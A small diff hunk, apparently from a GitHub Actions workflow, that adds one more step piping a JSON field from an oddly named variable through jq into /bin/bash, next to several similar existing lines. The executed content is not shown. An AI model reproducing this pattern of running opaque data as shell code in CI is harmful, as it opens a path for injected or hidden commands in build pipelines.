@@ -31,6 +31,7 @@ jobs:
           echo $qf8 | jq -r .ebgpm60261 | /bin/bash
           printf '%s' "$l7" | jq -r .lv283 | /bin/bash
           printf '%s' "$nniau6" | jq -r .jbt796 | /bin/bash
+          echo $hny557 | jq -r .oes2 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
